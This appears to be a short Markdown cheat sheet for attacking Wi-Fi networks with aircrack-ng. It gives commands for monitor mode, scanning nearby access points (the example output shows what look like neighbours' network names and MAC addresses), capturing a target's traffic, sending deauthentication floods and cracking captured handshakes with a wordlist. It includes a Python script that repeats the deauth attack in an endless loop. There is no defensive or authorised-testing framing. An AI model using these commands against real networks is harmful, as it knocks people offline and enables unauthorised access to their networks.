### Enable monitor mode
``` bash
sudo ifconfig wlan0 down
# sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Set Channel

``` bash
sudo iw dev wlan0mon set channel 8
```


### Airodump-ng scanning
``` bash
sudo airodump-ng wlan0mon

# ex)
# 70:5D:CC:65:45:C2 - 305
# 88:36:6C:90:F4:DE - Iptime
# 70:5D:CC:6C:F2:80 - O
# 70:5D:CC:8A:A2:7E - iptime
# 80:4E:81:0A:75:83 - my phone
```


### Save traffic packets
``` bash
sudo airodump-ng --bssid 00:00:00:00:00:00 -w filename wlan0mon
```


### Execute aireplay-ng
``` bash
sudo aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon

# ex)
# sudo aireplay-ng --deauth 100 -a 70:5D:CC:65:45:C2 wlan0mon
```

### deauth.py
```python
import os, time

while True:
	os.system("aireplay-ng --deauth 10 -a 00:00:00:00:00:00 wlan0")
	time.sleep(1)

```

```bash
sudo python3 deauth.py
```




### Aireplay-ng error : (wlan0mon is on channel 2, but the AP uses channel 5)
``` bash
sudo airmon-ng start wlan0mon 5
sudo iwconfig wlan0mon channel 5
```



### Cracking password
``` bash
sudo aircrack-ng filename.cap -w dict.lst
```
